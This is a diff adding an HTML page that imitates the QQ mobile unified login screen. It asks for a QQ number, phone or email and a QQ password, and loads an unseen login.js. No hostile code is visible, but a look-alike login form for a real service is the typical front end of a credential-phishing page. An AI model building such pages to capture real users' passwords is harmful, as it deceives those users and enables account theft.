@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8" />
+		<title>手机统一登录</title>
+		<link rel="stylesheet" href="css/Style.css" />
+		<script type="text/javascript" src="js/login.js" ></script>
+	</head>
+	<body>
+		<div id="content" class="content">
+			<div id="error_tips" style="display: none;"> 
+				<div id="error_tips_content">
+					<span id="error_icon"style="background-image: url(img/info.png);"></span> 
+					<span id="error_message">你还没有输入密码！</span>
+				</div>
+			</div>
+			
+			<div id="login" class="login">
+				<div id="logo" class="logo"></div>
+				<div id="app_name" style="display:none"></div>
+				<div id="q_login" class="q_login" style="display: none;">
+					<div id="q_login_title"><div id="q_login_logo"></div>
+					<label id="q_login_tips"> 请选择登录帐号 </label></div>
+					<div id="q_logon_list" class="q_logon_list"></div></div>
+					<div id="web_login" style="width: 290px; margin: 0 auto;">
+						<ul id="g_list" style="background: #fff; height: 89px; border-radius: 4px;">
+							<li id="g_u" style="border-bottom: 1px solid #eaeaea; position: relative;">
+								<div id="del_touch" class="del_touch">
+									<span id="del_u" class="del_u"></span>
+								</div>
+								
+								<input id="u" class="inputstyle" name="u" autocomplete="off" placeholder="QQ号码/手机/邮箱">
+							</li>
+							
+							<li id="g_p" style="position: relative;">
+								<div id="del_touch_p" class="del_touch">
+									<span id="del_p" class="del_u"></span>
+								</div>
+								
+								<input id="p" class="inputstyle" maxlength="16" type="password" name="p" autocorrect="off" placeholder="请输入你的QQ密码">
+							</li>
+						</ul>  
+						
+						<div href="javascript:;" id="go"> 登 录 </div>  
+						<div href="javascript:;" id="onekey" style="background: #146fdf; display: none;" > 一键登录 </div>  
+					</div>
+					
+					<div id="switch" style="width: 290px;">
+						<div id="zc_feedback">  
+							<span id="zc" >注册新帐号</span>   
+							<span id="forgetpwd">忘了密码？</span>  
+						</div>
+					</div>
+					
+					<div id="custom_bottom">  </div>  
+			</div>
+		</div>	
+	</body>
+</html>
